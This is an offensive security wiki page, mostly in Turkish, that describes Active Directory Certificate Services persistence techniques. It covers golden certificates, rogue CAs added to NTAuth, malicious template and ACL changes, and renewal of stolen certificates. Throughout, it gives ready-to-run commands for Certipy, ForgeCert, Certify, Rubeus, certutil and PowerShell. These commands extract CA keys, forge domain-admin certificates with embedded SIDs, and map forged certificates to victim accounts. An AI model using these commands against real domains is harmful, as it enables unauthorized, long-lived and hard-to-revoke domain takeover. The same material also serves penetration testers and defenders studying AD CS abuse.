# AD CS Domain Persistence

{{#include ../../../banners/hacktricks-training.md}}

**This is a summary of the domain persistence techniques shared in [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Check it for further details.

## Forging Certificates with Stolen CA Certificates (Golden Certificate) - DPERSIST1

How can you tell that a certificate is a CA certificate?

Bir sertifikanın CA sertifikası olduğunu nasıl anlarsınız?

- Sertifika, özel anahtarı makinenin DPAPI'siyle veya işletim sistemi destekliyorsa TPM/HSM gibi donanımla korunmuş şekilde CA sunucusunda saklanır.
- Sertifikanın Issuer ve Subject alanlarının her ikisi de CA'nın distinguished name'i ile eşleşir.
- Sadece CA sertifikalarında bulunan bir "CA Version" uzantısı mevcuttur.
- Sertifika Extended Key Usage (EKU) alanlarına sahip değildir.

Bu sertifikanın özel anahtarını çıkarmak için CA sunucusundaki certsrv.msc aracı, yerleşik GUI üzerinden desteklenen yöntemdir. Yine de, bu sertifika sistemde depolanan diğer sertifikalardan farklı değildir; bu nedenle çıkarma için [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) gibi yöntemler uygulanabilir.

Sertifika ve özel anahtar ayrıca Certipy kullanılarak aşağıdaki komutla elde edilebilir:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
CA sertifikasını ve özel anahtarını `.pfx` formatında edindikten sonra, [ForgeCert](https://github.com/GhostPack/ForgeCert) gibi araçlar geçerli sertifikalar oluşturmak için kullanılabilir:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> Sertifika taklidi hedeflenen kullanıcının işlem başarılı olabilmesi için Active Directory'de etkin ve kimlik doğrulaması yapabilir durumda olması gerekir. krbtgt gibi özel hesaplar için sertifika taklidi etkisizdir.

Bu sahte sertifika, belirtilen bitiş tarihine kadar **geçerli** olacak ve **root CA sertifikasının geçerli olduğu süre boyunca** (genellikle 5 ila **10+ yıl**) geçerli kalacaktır. Ayrıca **makineler** için de geçerlidir; bu nedenle **S4U2Self** ile birlikte kullanıldığında saldırgan **CA sertifikası geçerli olduğu sürece herhangi bir domain makinesinde kalıcılık sağlayabilir**.\
Ayrıca, bu yöntemle oluşturulan **sertifikalar** **iptal edilemez**, çünkü CA bunların varlığından haberdar değildir.

### Strong Certificate Mapping Enforcement (2025+) altında çalışma

11 Şubat 2025'ten itibaren (KB5014754 dağıtımından sonra), domain controllers varsayılan olarak sertifika eşlemeleri için **Full Enforcement** uygulamasını kullanır. Pratikte bu, sahte sertifikalarınızın ya şu şartlardan birini sağlaması gerektiği anlamına gelir:

- Hedef hesaba güçlü bir bağ içermesi (örneğin, SID security extension), veya
- Hedef nesnenin `altSecurityIdentities` özniteliğinde güçlü, açık bir eşleme ile eşleştirilmiş olması.

Kalıcılık için güvenilir bir yaklaşım, çalınmış Enterprise CA'ya zincirlenmiş sahte bir sertifika üretmek ve ardından hedef principal'e güçlü, açık bir eşleme eklemektir:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Notlar
- SID güvenlik uzantısını içerecek şekilde sahte sertifikalar oluşturabiliyorsanız, bunlar Full Enforcement altında bile örtük olarak eşlenecektir. Aksi takdirde açık, güçlü eşlemeleri tercih edin. Açık eşlemeler hakkında daha fazla bilgi için bkz. [account-persistence](account-persistence.md).
- Geri çağırma burada savunmacılara yardımcı olmaz: sahte sertifikalar CA database tarafından bilinmez ve bu yüzden geri çağırılamaz.

#### Full-Enforcement uyumlu sahteleme (SID-aware)

Güncellenmiş araçlar SID'i doğrudan gömmenize izin verir, böylece DCs zayıf eşlemeleri reddettiğinde bile golden certificates kullanılabilir kalır:
```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
--upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
--outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
-sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```
SID'yi gömerek `altSecurityIdentities` ile uğraşmak zorunda kalmazsınız; bu alan izleniyor olabilir, yine de güçlü eşleme kontrollerini sağlamış olursunuz.

## Trusting Rogue CA Certificates - DPERSIST2

`NTAuthCertificates` nesnesi, Active Directory (AD) tarafından kullanılan `cacertificate` özniteliği içinde bir veya daha fazla **CA certificates** içerecek şekilde tanımlanmıştır. Doğrulama süreci, **domain controller** tarafından, kimlik doğrulayan **certificate**'in Issuer alanında belirtilen **CA specified** ile eşleşen bir girişi `NTAuthCertificates` nesnesinde aramayı içerir. Eğer bir eşleşme bulunursa kimlik doğrulama devam eder.

Bir saldırgan, bu AD nesnesi üzerinde kontrole sahipse, `NTAuthCertificates` nesnesine self-signed bir **CA certificate** ekleyebilir. Normalde, yalnızca **Enterprise Admin** grubunun üyeleri ile **forest root’s domain** içindeki **Domain Admins** veya **Administrators** üyelerine bu nesneyi değiştirme izni verilir. `NTAuthCertificates` nesnesini `certutil.exe` ile `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA` komutunu kullanarak veya [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool) aracılığıyla düzenleyebilirler.

Bu teknik için ek yararlı komutlar:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Bu yetenek, ForgeCert kullanılarak dinamik sertifika oluşturmayı içeren daha önce açıklanan yöntemle birlikte kullanıldığında özellikle önemlidir.

> Post-2025 mapping considerations: placing a rogue CA in NTAuth only establishes trust in the issuing CA. To use leaf certificates for logon when DCs are in **Full Enforcement**, the leaf must either contain the SID security extension or there must be a strong explicit mapping on the target object (for example, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## Kötü Amaçlı Yanlış Yapılandırma - DPERSIST3

AD CS bileşenlerinde yapılan **security descriptor modifications of AD CS** yoluyla **persistence** için çok sayıda fırsat vardır. "[Domain Escalation](domain-escalation.md)" bölümünde tanımlanan değişiklikler, yükseltilmiş erişime sahip bir saldırgan tarafından kötü amaçlı olarak uygulanabilir. Bu, aşağıdakiler gibi hassas bileşenlere "kontrol hakları" (ör. WriteOwner/WriteDACL/etc.) eklenmesini içerir:

- **CA sunucusunun AD computer** nesnesi
- **CA sunucusunun RPC/DCOM sunucusu**
- **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** içindeki herhangi bir **descendant AD object or container** (örneğin, Certificate Templates container, Certification Authorities container, NTAuthCertificates nesnesi vb.)
- AD CS'yi kontrol etme hakları varsayılan olarak veya kuruluş tarafından devredilmiş AD grupları (ör. yerleşik Cert Publishers grubu ve üyeleri)

Kötü amaçlı bir uygulama örneğinde, etki alanında **elevated permissions** sahibi bir saldırgan, saldırganın bu hakkın sahibi olduğu şekilde varsayılan **`User`** sertifika şablonuna **`WriteOwner`** iznini ekleyebilir. Bunu istismar etmek için saldırgan önce **`User`** şablonunun sahipliğini kendisine geçirirdi. Ardından, şablonda **`mspki-certificate-name-flag`** **1** olarak ayarlanarak **`ENROLLEE_SUPPLIES_SUBJECT`** etkinleştirilir; bu, bir kullanıcının istekte Subject Alternative Name sağlamasına izin verir. Daha sonra saldırgan, **şablonu** kullanarak **enroll** olabilir, alternatif ad olarak bir **domain administrator** adı seçebilir ve alınan sertifikayı DA olarak kimlik doğrulama için kullanabilir.

Uzun vadeli domain persistence için saldırganların ayarlayabileceği pratik kontroller (tam detaylar ve tespit için bkz. {{#ref}}domain-escalation.md{{#endref}}):

- CA policy flags that allow SAN from requesters (e.g., enabling `EDITF_ATTRIBUTESUBJECTALTNAME2`). This keeps ESC1-like paths exploitable.
- Template DACL or settings that allow authentication-capable issuance (e.g., adding Client Authentication EKU, enabling `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Controlling the `NTAuthCertificates` object or the CA containers to continuously re-introduce rogue issuers if defenders attempt cleanup.

> [!TIP]
> KB5014754 sonrasında sertleştirilmiş ortamlarda, bu yanlış yapılandırmaları açık ve güçlü eşlemelerle (`altSecurityIdentities`) eşleştirmek, DC'ler güçlü eşlemeyi uygulasa bile verdiğiniz veya sahtelediğiniz sertifikaların kullanılabilir kalmasını sağlar.

### Sertifika yenileme suistimali (ESC14) ile kalıcılık

Kimlik doğrulamaya uygun bir sertifikayı (veya bir Enrollment Agent sertifikasını) ele geçirirseniz, veren şablon yayınlı kaldığı ve CA'nız hâlâ issuer chain'e güvendiği sürece **süresiz olarak yenileyebilirsiniz**. Yenileme orijinal kimlik bağlamlarını korur fakat geçerliliği uzatır; bu da şablon düzeltilmediği veya CA yeniden yayımlanmadığı sürece sertifikayı sistemden çıkarmayı zorlaştırır.
```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```
Eğer domain controller'lar **Full Enforcement** durumundaysa, yenilenen leaf sertifikanın `altSecurityIdentities`'e dokunmadan güçlü eşleşmeye devam etmesi için `-sid <victim SID>` ekleyin (veya SID security extension'ı hâlâ içeren bir template kullanın). CA admin yetkisine sahip saldırganlar ayrıca kendilerine sertifika vermeden önce yenilenen sertifika ömürlerini uzatmak için `policy\RenewalValidityPeriodUnits`'ü değiştirebilirler.

## Referanslar

- [Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [Certipy – Command Reference and forge/auth usage](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [SpecterOps – Certify 2.0 (integrated forge with SID support)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [ESC14 renewal abuse overview](https://www.adcs-security.com/attacks/esc14)
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
